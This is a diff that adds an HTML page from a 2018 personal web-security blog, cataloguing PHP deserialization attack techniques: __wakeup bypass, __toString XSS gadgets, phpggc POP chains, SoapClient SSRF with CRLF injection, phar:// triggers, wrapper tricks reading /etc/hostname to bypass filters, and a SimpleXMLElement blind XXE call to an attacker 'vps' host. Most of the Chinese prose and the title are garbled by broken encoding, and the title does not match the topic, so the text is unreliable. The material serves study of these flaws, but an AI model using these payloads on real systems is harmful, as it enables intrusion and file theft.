@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>��½�����SQLע�� | ZenisLTZ&#39;s Blog</title>
+  <meta name="description" content="PHP Deserialization1.PHP Serialization Basic123456789101112a - arrayb - booleand - doublei - integero - common objectr - references - stringC - custom objectO - classN - nullR - pointer referenceU - u">
+<meta name="keywords" content="php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="��½�����SQLע��">
+<meta property="og:url" content="http://ZenisLTZ.github.io/2018/12/09/Deserialize/index.html">
+<meta property="og:site_name" content="ZenisLTZ">
+<meta property="og:description" content="PHP Deserialization1.PHP Serialization Basic123456789101112a - arrayb - booleand - doublei - integero - common objectr - references - stringC - custom objectO - classN - nullR - pointer referenceU - u">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-12-08T19:26:23.717Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="��½�����SQLע��">
+<meta name="twitter:description" content="PHP Deserialization1.PHP Serialization Basic123456789101112a - arrayb - booleand - doublei - integero - common objectr - references - stringC - custom objectO - classN - nullR - pointer referenceU - u">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://ZenisLTZ.github.io/2018/12/09/Deserialize/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="ZenisLTZ" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  
+  
+  
+</head>
+
+
+<body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/ZenisLTZ" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">boris lee</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md"></h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Nanjing, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">Repository</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">Books</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/ZenisLTZ" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/borislee26@gmail.com" target="_blank" title="E-Mail" data-toggle=tooltip data-placement=top><i class="icon icon-E-Mail"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>welcome to discuss on Web security</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli/">sqli</a><span class="tag-list-count">3</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/PHP/" style="font-size: 13px;">PHP</a> <a href="/tags/php/" style="font-size: 13.5px;">php</a> <a href="/tags/python/" style="font-size: 13px;">python</a> <a href="/tags/sqli/" style="font-size: 14px;">sqli</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a><span class="archive-list-count">4</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2018/12/09/PHP tricks/" class="title">��½�����SQLע��</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2018-12-08T19:25:28.756Z" itemprop="datePublished">2018-12-09</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2018/12/09/Deserialize/" class="title">��½�����SQLע��</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2018-12-08T19:24:48.964Z" itemprop="datePublished">2018-12-09</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2018/11/02/WideBytesInj/" class="title">宽字节注入</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2018-11-01T18:38:11.688Z" itemprop="datePublished">2018-11-02</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2018/10/21/登陆界面的SQL注入/" class="title">登陆界面的SQL注入</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2018-10-20T17:46:50.143Z" itemprop="datePublished">2018-10-21</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2018/10/21/sqltec_mysql/" class="title">mysql的注入技巧</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2018-10-20T17:46:50.115Z" itemprop="datePublished">2018-10-21</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-Deserialize" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ��½�����SQLע��
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2018/12/09/Deserialize/" class="article-date">
+	  <time datetime="2018-12-08T19:24:48.964Z" itemprop="datePublished">2018-12-09</time>
+	</a>
+</span>
+        
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link" href="/tags/php/">php</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2018/12/09/Deserialize/#comments" class="article-comment-link">Comments</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="PHP-Deserialization"><a href="#PHP-Deserialization" class="headerlink" title="PHP Deserialization"></a>PHP Deserialization</h1><h2 id="1-PHP-Serialization-Basic"><a href="#1-PHP-Serialization-Basic" class="headerlink" title="1.PHP Serialization Basic"></a>1.PHP Serialization Basic</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a - array</span><br><span class="line">b - boolean</span><br><span class="line">d - double</span><br><span class="line">i - integer</span><br><span class="line">o - common object</span><br><span class="line">r - reference</span><br><span class="line">s - string</span><br><span class="line">C - custom object</span><br><span class="line">O - class</span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - unicode string</span><br></pre></td></tr></table></figure>
+<ul>
+<li>public����:        ֱ�ӱ�����</li>
+<li>private����:         \x00 + ���� + \x00 + ������ </li>
+<li>protected����:    \x00 + * + \x00 + ������</li>
+</ul>
+<h3 id="��Щ�಻һ���ܹ����У��������л�-V5-3"><a href="#��Щ�಻һ���ܹ����У��������л�-V5-3" class="headerlink" title="��Щ�಻һ���ܹ����У��������л�(V5.3+)"></a>��Щ�಻һ���ܹ����У��������л�(V5.3+)</h3><p>��SimpleXMLElement</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#PHP/ext/simplexml/simplexml.c</span><br><span class="line">sxe_class_entry-&gt;serialize = zend_class_serialize_deny;		//���ܱ����л�</span><br><span class="line">sxe_class_entry-&gt;unserialize = zend_class_unserialize_deny;	//���ܱ������л�</span><br></pre></td></tr></table></figure>
+<h3 id="����˼·"><a href="#����˼·" class="headerlink" title="����˼·"></a>����˼·</h3><p>��ͬ��ħ�����������˲�ͬ�����÷�ʽ��ͨ������ĳһ������payload���෴���л���������ܴ�����ħ�������ĺ�����ͨ���ǿ���������֮��ģ�������<code>__wakeup/__destruct</code>���౻�����л�֮�󡱿϶����ᱻִ��(�ƹ�<code>__wakeup</code>�ķ�������)�������Ķ��д�����ʽ�������ܽ�ĺܶ���</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__wakeup/__destruct		�����л�ʱֱ��ִ��</span><br><span class="line">__call					�������δ�����ķ�����Soapclient��</span><br><span class="line">__toString				��ӡһ�������ʱ������,���ڴ�ӡ�ĺ���������</span><br><span class="line">*__construct		���캯������ʵ�ܵ���������������Բ���Ϊ�����л�©�����˻����Ͽ�����ֱ�ӵ���һ����</span><br></pre></td></tr></table></figure>
+<h2 id="2-Technique"><a href="#2-Technique" class="headerlink" title="2.Technique"></a>2.Technique</h2><h3 id="2-1-�ƹ�-wakeup����"><a href="#2-1-�ƹ�-wakeup����" class="headerlink" title="2.1 �ƹ�__wakeup����"></a>2.1 �ƹ�__wakeup����</h3><p>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p>
+<p><a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=72663</a></p>
+<p>CVE-2016-7124  ����Ա������Ŀ����ʵ����Ŀʱ���ƹ�</p>
+<h3 id="2-2-toString���������÷�ʽ"><a href="#2-2-toString���������÷�ʽ" class="headerlink" title="2.2 __toString���������÷�ʽ"></a>2.2 __toString���������÷�ʽ</h3><h4 id="2-2-1-������ʽ"><a href="#2-2-1-������ʽ" class="headerlink" title="2.2.1 ������ʽ"></a>2.2.1 ������ʽ</h4><p>��phar�ļ����������л��ķ������ƣ����к��ļ������йصĺ���</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo </span><br><span class="line">getimagesize</span><br><span class="line">touch</span><br><span class="line">file_get_contents ...</span><br></pre></td></tr></table></figure>
+<h4 id="2-2-2-ʵ��XSS�����o���"><a href="#2-2-2-ʵ��XSS�����o���" class="headerlink" title="2.2.2 ʵ��XSS�����õ���:"></a>2.2.2 ʵ��XSS�����õ���:</h4><p><a href="https://www.freebuf.com/vuls/80293.html" target="_blank" rel="noopener">ͨ��PHP�����л�����Զ�̴���ִ��</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Exception::__toString</span><br><span class="line">ErrorException::__toString</span><br><span class="line">DateTime::__wakeup</span><br><span class="line">ReflectionException::__toString</span><br><span class="line">ReflectionFunctionAbstract::__toString</span><br><span class="line">ReflectionFunction::__toString</span><br><span class="line">ReflectionParameter::__toString</span><br><span class="line">ReflectionMethod::__toString</span><br><span class="line">ReflectionClass::__toString</span><br><span class="line">ReflectionObject::__toString</span><br><span class="line">ReflectionProperty::__toString</span><br><span class="line">ReflectionExtension::__toString</span><br><span class="line">LogicException::__toString</span><br><span class="line">BadFunctionCallException::__toString</span><br><span class="line">BadMethodCallException::__toString</span><br><span class="line">DomainException::__toString</span><br><span class="line">InvalidArgumentException::__toString</span><br><span class="line">LengthException::__toString</span><br><span class="line">OutOfRangeException::__toString</span><br><span class="line">RuntimeException::__toStrings</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//$a = new Error(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;); (PHP 7+)</span><br><span class="line">$a = new Exception(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;);</span><br><span class="line">echo unserialize(serialize($a));</span><br><span class="line">file_get_contents(unserialize(serialize($a)));</span><br></pre></td></tr></table></figure>
+<h3 id="2-3-Composer�еL��"><a href="#2-3-Composer�еL��" class="headerlink" title="2.3 Composer�еĿ��"></a>2.3 Composer�еĿ��</h3><p>phpggc������������payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php phpggc -l</span><br></pre></td></tr></table></figure>
+<h4 id="2-3-1-���ڷ����л�©���I�"><a href="#2-3-1-���ڷ����л�©���I�" class="headerlink" title="2.3.1 ���ڷ����л�©���İ�"></a>2.3.1 ���ڷ����л�©���İ�</h4><ul>
+<li>cartalyst/sentry(5.3+)</li>
+<li>cartalyst/sentinel(5.4+)</li>
+</ul>
+<h4 id="2-3-2-һЩ���Թ���POP-chain�I�"><a href="#2-3-2-һЩ���Թ���POP-chain�I�" class="headerlink" title="2.3.2 һЩ���Թ���POP chain�İ�"></a>2.3.2 һЩ���Թ���POP chain�İ�</h4><ul>
+<li><p>Arbitrary Write:</p>
+<ul>
+<li><p>monolog/monolog (&lt;1.11.0)</p>
+</li>
+<li><p>guzzlehttp/guzzle(6.0.0 &lt;= 6.3.2)</p>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="2018-��̱�-Babyt2"><a href="#2018-��̱�-Babyt2" class="headerlink" title="2018 ��̱�  Babyt2"></a>2018 ��̱�  Babyt2</h5><ul>
+<li><p>Arbitrary Delete:</p>
+<ul>
+<li>swiftmailer/swiftmailer</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-4-SoapClient���SSRF"><a href="#2-4-SoapClient���SSRF" class="headerlink" title="2.4 SoapClient���SSRF"></a>2.4 SoapClient���SSRF</h3><p>extension=php_soap<br>SoapClient�ڷ�wsdlģʽ�·����л����Է����������SSRF+CRLF���ں����İ汾�з����л�����ֱ�ӷ������ӣ���������ֱ�ӵ���һ�������ڵ��෽��(��Ϊ�ײ������__call����),�����ᷢ��Header��SOAPAction����Ϊ<code>&lt;uri&gt;#&lt;���õķ�����&gt;</code></p>
+<p>user-agentͷ��������CRLF,�Ӷ������޸�Content-TypeΪmultipart/form-data������POST����,���demo</p>
+<ul>
+<li><p>N1CTF easy_harder_php</p>
+<p>Deserialzation+CRLF+SSRF</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a = new SoapClient(null, array(&apos;location&apos; =&gt; &quot;http://127.0.0.1:1234&quot;,&apos;uri&apos; =&gt; &quot;123&quot;));</span><br><span class="line">	$a-&gt;a();</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:1234</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">User-Agent: PHP-SOAP/7.2.12</span><br><span class="line">Content-Type: text/xml; charset=utf-8</span><br><span class="line">SOAPAction: &quot;123#a&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="2-5-PHP-Session�����л�"><a href="#2-5-PHP-Session�����л�" class="headerlink" title="2.5 PHP Session�����л�"></a>2.5 PHP Session�����л�</h3><p>��PHP Session Security����</p>
+<h3 id="2-6-phar�l������л�"><a href="#2-6-phar�l������л�" class="headerlink" title="2.6 phar�ļ������л�"></a>2.6 phar�ļ������л�</h3><p>���©���ĳ��ָı��˷����л�©����ͳ�����÷�ʽ������Ҫunserialize(),ֻ��Ҫuri����phar�ļ����ɣ�����������˹����棨ʲôʱ����Orange����PHPԴ��϶��������棩</p>
+<h4 id="2-6-1-��������"><a href="#2-6-1-��������" class="headerlink" title="2.6.1 ��������"></a>2.6.1 ��������</h4><ol>
+<li>phar�ļ�Ҫ�ܹ��ϴ����������ˡ�</li>
+<li>Ҫ�п��õ�ħ��������Ϊ�����塱��</li>
+<li>�ļ����������Ĳ����ɿأ��� phar:// �������ַ�û�б�����</li>
+</ol>
+<p>ʹ��phar://Э���ȡ�ļ���ʱ���ļ����ݻᱻ������phar����Ȼ��phar�����ڵ�Metadata��Ϣ�ᱻ�����л�</p>
+<p>�����phar����ʵ�������ļ�����:</p>
+<p><a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">Phar��Stream Wrapper���PHP RCE�������ھ�</a></p>
+<p>��Ҫ��Ҫ�ҳ���php_stream_open_wrapper�ĺ���</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fileatime / filectime / filemtime</span><br><span class="line">stat / fileinode / fileowner / filegroup / fileperms / filesize</span><br><span class="line">file / file_get_contents / readfile / fopen</span><br><span class="line">file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable</span><br><span class="line">include</span><br><span class="line">parse_ini_file</span><br><span class="line">unlink / copy / touch</span><br><span class="line"></span><br><span class="line"># exif:	exif_thumbnail/exif_imagetype</span><br><span class="line"># gd:	imageloadfont/imagecreatefrom***</span><br><span class="line"># file/url:	get_meta_tags / get_headers</span><br><span class="line"># Hash:	hash_hmac_file / hash_file / hash_update_file / md5_file / sha1_file</span><br><span class="line"># standard: getimagesize / getimagesizefromstring</span><br><span class="line"># others:</span><br><span class="line">SimpleXmlElement::__construct($url, LIBXML_NONET, true)	//LIBXML_NONET��Ӱ��phar wrapper</span><br><span class="line">PDO::pgsqlCopyFromFile(string $table_name , string $filename,...)	//$filename����phar wrapper</span><br><span class="line">ZipArchive::extractTo ( string $destination,...)</span><br><span class="line">mysqli_query��sql����У� LOAD DATA LOCAL INFILE</span><br></pre></td></tr></table></figure>
+<h4 id="2-6-2-Bypass-Waf"><a href="#2-6-2-Bypass-Waf" class="headerlink" title="2.6.2 Bypass Waf"></a>2.6.2 Bypass Waf</h4><ul>
+<li>phpαЭ�鲻���ִ�Сд</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">readfile(&quot;PHP://FILTER/convert.BASE64-ENCODE/resource=/etc/hostname&quot;);</span><br><span class="line">readfile(&quot;FILE:///etc/hostname&quot;);</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>compress.zlib://������Э��</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib://phar:///var/www/html</span><br><span class="line">compress.bzip2://phar:///</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="2-6-3-Example"><a href="#2-6-3-Example" class="headerlink" title="2.6.3 Example"></a>2.6.3 Example</h4><ul>
+<li>hitcon2017 </li>
+<li>Typo3(20180609)</li>
+<li>WordPress(20170228)</li>
+<li>Contao TCPDF(20180524)</li>
+</ul>
+<h3 id="2-7-construct�������ʵ����"><a href="#2-7-construct�������ʵ����" class="headerlink" title="2.7 __construct�������ʵ����"></a>2.7 <code>__construct</code>�������ʵ����</h3><p>���൱�������е���ĳ���Ѿ��������࣬ �Ѿ��������������get_declared_classes()�����鿴</p>
+<h4 id="2-7-1-ReflectionClass-�������Զ������"><a href="#2-7-1-ReflectionClass-�������Զ������" class="headerlink" title="2.7.1 ReflectionClass �������Զ������"></a>2.7.1 ReflectionClass �������Զ������</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function createInstanceFromNamedArguments($className, $arguments)&#123;</span><br><span class="line">       $reflectionClass = new \ReflectionClass($className);</span><br><span class="line">       $constructorParams =$reflectionClass-&gt;getConstructor()-&gt;getParameters();</span><br><span class="line">       return $reflectionClass-&gt;newInstanceArgs($arguments);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="2-7-2-SimpleXMLElementʵ��XXE"><a href="#2-7-2-SimpleXMLElementʵ��XXE" class="headerlink" title="2.7.2 SimpleXMLElementʵ��XXE"></a>2.7.2 SimpleXMLElementʵ��XXE</h4><p><a href="https://www.freebuf.com/vuls/154415.html" target="_blank" rel="noopener">��PHP����ʵ������Blind XXE</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimpleXMLElement(&quot;http://&lt;vps/xxe.xml&gt;&quot;, LIBXML_NONE, true)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>SUCTF2018 WEB homework</li>
+</ul>
+<h2 id="3-Examples"><a href="#3-Examples" class="headerlink" title="3. Examples"></a>3. Examples</h2><ul>
+<li><p>CVE-2015-8562: Joomla Remote Code Execution</p>
+</li>
+<li><p>CVE-2015-7808: vBulletin 5 Unserialize Code Execution</p>
+</li>
+<li><p>CVE-2015-2171: Slim Framework PHP Object Injection</p>
+</li>
+<li><p>CVE-2016-7124</p>
+</li>
+<li><p>CVE-2017-6920 Drupal Yaml�����л�©��</p>
+<p> <a href="https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">��PHPGGC���PHP�����л�©��</a></p>
+</li>
+</ul>
+<ul>
+<li><p>Typecho�����л�</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">install.php---&gt;Db-&gt;__toString------&gt;Feed-&gt;__get----&gt;_applyFilter</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>MWR Labs<br>  Laravel -&gt; Cookie Forgery -&gt; Decryption -&gt; RCE </p>
+</li>
+</ul>
+<h2 id="4-Links"><a href="#4-Links" class="headerlink" title="4. Links"></a>4. Links</h2><ul>
+<li><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html" target="_blank" rel="noopener">�����л�֮PHPԭ���������</a></li>
+<li><a href="https://prezi.com/67dwboesxevo/copy-of-php-object-injection-revisited/" target="_blank" rel="noopener">Copy of PHP Object Injection Revisited</a></li>
+<li><a href="https://www.freebuf.com/vuls/116705.html" target="_blank" rel="noopener">��HITCON 2016һ��web��һ��php�����л�©��</a></li>
+<li><a href="https://www.secpulse.com/archives/74827.html" target="_blank" rel="noopener">blackhat�������� | phar�����л�</a></li>
+<li><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">���� phar ��չ php �����л�©��������</a></li>
+</ul>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://ZenisLTZ.github.io/2018/12/09/Deserialize/" title="��½�����SQLע��" target="_blank" rel="external">http://ZenisLTZ.github.io/2018/12/09/Deserialize/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/ZenisLTZ" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/ZenisLTZ" target="_blank"><span class="text-dark">boris lee</span><small class="ml-1x"></small></a></h3>
+        <div>Web security researcher</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2018/12/09/PHP tricks/" title="��½�����SQLע��"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
+    </li>
+    
+    
